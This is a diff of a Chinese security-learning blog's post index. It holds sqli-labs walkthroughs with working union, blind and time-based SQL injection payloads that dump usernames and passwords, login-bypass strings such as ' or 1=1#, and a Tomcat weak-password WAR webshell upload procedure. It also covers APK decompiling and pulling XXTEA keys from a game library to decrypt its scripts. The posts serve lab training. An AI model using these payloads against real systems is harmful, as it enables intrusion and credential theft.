+<h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p>
+<p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p>
+<p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p>
+<h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
+<p>if判断语句，条件为假，执行sleep</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure>
+<p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>sqli-labs靶场</category>
       </categories>
       <tags>
-        <tag>Tomcat</tag>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
-    <title>Tomcat-弱口令-getshell复现过程</title>
-    <url>/2020/08/12/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache+Tomcat 是很常用的网站解决方案，Apache 用于提供 web 服务，而 Tomcat 是 Apache 服务器的扩展，用于运行 jsp 页面和 servlet。Tomcat 有一个管理后台，其用户名和密码在 Tomcat 安装目录下的 conf\tomcat-users.xml 文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署 war 包，可以直接将 webshell 部署到 web 目录下，如果 tomcat 后台管理用户存在弱口令，这很容易被利用上传 webshell。</p>
-<h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
-<a id="more"></a>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
-<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081201.png" alt="image"></p>
-</li>
-<li><p>访问漏洞环境，点击“Manager App”<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081202.png" alt="image"></p>
-</li>
-<li><p>弱口令登录，账号tomcat，密码tomcat</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081203.png" alt="image"></p>
-</li>
-<li><p>把jsp木马解压为zip压缩文件，改后缀名为war</p>
-</li>
-<li><p>上传war包<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081204.png" alt="image"></p>
-</li>
-<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081205.png" alt="image"></p>
-</li>
-<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081206.png" alt="image"></p>
-</li>
-</ol>
+    <title>sqli-labs靶场Less-1-4</title>
+    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
+    <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p>
+<h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p>
+<p>证明有三个字段</p>
+<h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
+<p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p>
+<p>得到能回显的字段是2和3</p>
+<h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p>
+<h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p>
+<h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p>
+<h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p>
+<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
+<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p>
+<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p>
+<p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>sqli-labs靶场</category>
       </categories>
       <tags>
-        <tag>Tomcat</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-Background-1 基础知识</title>
+    <url>/2020/09/22/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-1%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>此处介绍一些<strong>mysql</strong>注入的基础知识</p>
+<h2 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ol>
+<li>基于错误的SQL注入</li>
+<li>联合查询的类型</li>
+<li>堆查询注入</li>
+<li>SQL盲注<ul>
+<li>基于布尔的SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+</li>
+</ol>
+<h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ol>
+<li>基于字符串</li>
+<li>数字或整数为基础的</li>
+</ol>
+<h3 id="基于程度和顺序的注入（哪里发生了影响）"><a href="#基于程度和顺序的注入（哪里发生了影响）" class="headerlink" title="基于程度和顺序的注入（哪里发生了影响）"></a>基于程度和顺序的注入（哪里发生了影响）</h3><ol>
+<li>一阶注入</li>
+<li>二阶注入<blockquote>
+<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存<br>储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间<br>接的对 WEB 产生危害，这样的就被称为是二阶注入</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="基于注入位置上的"><a href="#基于注入位置上的" class="headerlink" title="基于注入位置上的"></a>基于注入位置上的</h3><ol>
+<li>通过用户输入的表单域的注入</li>
+<li>通过cookie注入</li>
+<li>通过服务器变量注入。（基于头部信息的注入）</li>
+</ol>
+<h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><p>介绍几个常用函数</p>
+<ol>
+<li><strong>version()</strong>——MySQL版本</li>
+<li><strong>user()</strong>——数据库用户名</li>
+<li><strong>datebase()</strong>——数据库名</li>
+<li><strong>@@datadir</strong>——数据库路径</li>
+<li><strong>@@version_compile_os</strong>——操作系统版本</li>
+</ol>
+<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p><a href="http://www.cnblogs.com/lcamry/p/5715634.html">函数具体介绍</a></p>
+<ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符的连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了</li>
+</ol>
+<h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p>ps：–+可以用#替换，url提交过程中url编码后的#为%23</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
+<p>一般的代码为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
+<h2 id="union操作符的介绍"><a href="#union操作符的介绍" class="headerlink" title="union操作符的介绍"></a>union操作符的介绍</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同。</p>
+<h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
+<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
+<h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
+<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
+<h2 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h2><p>首先提出一个问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br></pre></td></tr></table></figure>
+<p>上面这条语句为什么能够选择出id=1的内容，and 1=1到底起了什么作用？这里就要清除sql语句执行顺序了。同时这个问题我们在使用万能密码的时候会用到。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’admin’</span><br></pre></td></tr></table></figure>
+<p>我们可以用’ or 1=1#作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’’or 1&#x3D;1#’</span><br></pre></td></tr></table></figure>
+<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092201.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">①Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br><span class="line">②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1;</span><br><span class="line">③Select * from users where id&#x3D;1 &amp; 1&#x3D;1;</span><br></pre></td></tr></table></figure>
+<p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p>
+<p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
+<p>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从<br>ascii 值反推回字符。（运用较少）</p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -618,256 +547,412 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-Background-1 基础知识</title>
-    <url>/2020/09/22/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-1%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>此处介绍一些<strong>mysql</strong>注入的基础知识</p>
-<h2 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ol>
-<li>基于错误的SQL注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注入</li>
-<li>SQL盲注<ul>
-<li>基于布尔的SQL盲注</li>
-<li>基于时间的SQL盲注</li>
-<li>基于报错的SQL盲注</li>
+    <title>APP之反编译+目录结构+重新打包+重新签名</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
+    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
+<ol>
+<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
+<li>在cmd窗口下进入当前目录</li>
+<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
+<p>apktool d qipai.apk</p>
+</blockquote>
+</li>
+<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
+<p>apktool b test</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
+<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
+<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
+<li><strong>classes.dex</strong>：源码文件</li>
+<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
+<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
+<li><strong>META-INF</strong>：apk的签名信息</li>
+</ol>
+<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
+<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
+<li>解压<strong>dex2jar.jar</strong>文件</li>
+<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
+<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
+<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
+<p>d2j-dex2jar.bat classes.dex</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
+<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
+<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
+<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
+<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
+</ol>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>luac的解密过程</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
+<ol>
+<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
+<li>加密key与程序内部约定某个值。</li>
+</ol>
+<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
+<a id="more"></a>
+<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
+<ol>
+<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
+</li>
+<li><p>寻找加密<strong>key</strong></p>
+<ul>
+<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
+<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
+<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
+<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
 </ul>
 </li>
-</ol>
-<h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ol>
-<li>基于字符串</li>
-<li>数字或整数为基础的</li>
-</ol>
-<h3 id="基于程度和顺序的注入（哪里发生了影响）"><a href="#基于程度和顺序的注入（哪里发生了影响）" class="headerlink" title="基于程度和顺序的注入（哪里发生了影响）"></a>基于程度和顺序的注入（哪里发生了影响）</h3><ol>
-<li>一阶注入</li>
-<li>二阶注入<blockquote>
-<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存<br>储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间<br>接的对 WEB 产生危害，这样的就被称为是二阶注入</p>
-</blockquote>
+<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
 </li>
 </ol>
-<h3 id="基于注入位置上的"><a href="#基于注入位置上的" class="headerlink" title="基于注入位置上的"></a>基于注入位置上的</h3><ol>
-<li>通过用户输入的表单域的注入</li>
-<li>通过cookie注入</li>
-<li>通过服务器变量注入。（基于头部信息的注入）</li>
-</ol>
-<h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><p>介绍几个常用函数</p>
-<ol>
-<li><strong>version()</strong>——MySQL版本</li>
-<li><strong>user()</strong>——数据库用户名</li>
-<li><strong>datebase()</strong>——数据库名</li>
-<li><strong>@@datadir</strong>——数据库路径</li>
-<li><strong>@@version_compile_os</strong>——操作系统版本</li>
-</ol>
-<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p><a href="http://www.cnblogs.com/lcamry/p/5715634.html">函数具体介绍</a></p>
-<ol>
-<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
-<li>concat_ws(separator,str1,str2,…)——含有分隔符的连接字符串</li>
-<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了</li>
-</ol>
-<h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p>ps：–+可以用#替换，url提交过程中url编码后的#为%23</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
-<p>一般的代码为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
